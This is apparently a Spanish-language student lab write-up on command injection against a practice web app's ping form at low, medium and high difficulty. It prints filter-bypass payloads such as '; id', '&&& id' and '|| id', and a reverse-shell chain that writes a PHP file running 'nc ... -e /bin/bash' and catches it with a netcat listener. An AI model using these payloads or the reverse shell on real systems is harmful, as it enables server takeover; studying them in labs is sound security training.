# Command Injection

La vulnerabilidad de inyección de comandos es una vulnerabilidad de seguridad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor. Esto puede conducir a la ejecución de comandos arbitrarios en el sistema operativo del servidor.

## Bajo

El planteamiento seguido ha sido el de ejecutar un comando despues de otro, para ello, hemos completado el `ping -c 4` con una ip y a continueación hemos añadido la sentencia `; id` para mostrar el usuario que ejecuta el servicio web.

```bash
127.0.0.1 > /dev/null; id
```

## Medio

Para este nivel, vemos que entradas como las siguientes no funcionan, esto es debido a que el servidor esta eliminando expresiones como `;` y `&&`.

```bash
127.0.0.1 > /dev/null; id
127.0.0.1 > /dev/null && id
```

Sin embargo, podemos aprovechar que la implementacion no es segura y con alguna pequeña modificación podemos bypassear la protección.

```bash
127.0.0.1 > /dev/null &&& id # (&& * N) + 3& -> [&&&, &&&&&, &&&&&&&]
```
```bash
- || id
```

--- 

### Reverse shell

```bash
- || echo '<?php system("nc 127.0.0.1 4000 -e /bin/bash"); ?>' > shell.php
```

```bash	
nc -lvnp 4000
```

```bash
- || php shell.php
```

## Alto

En este nivel, vemos que el servidor esta filtrando la entrada de comandos, por lo que no podemos ejecutar comandos arbitrarios. Sin embargo, al probar el comando utilizado para el nivel medio, vemos que el servidor esta fallando al filtrar la entrada.

```bash
- || id
```

Se ha detectado otra brecha al escribir el siguiente comando sin ningún espacio.

```bash
127.0.0.1|id
```

![challenge](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/CI/assets/challenge-1.png)


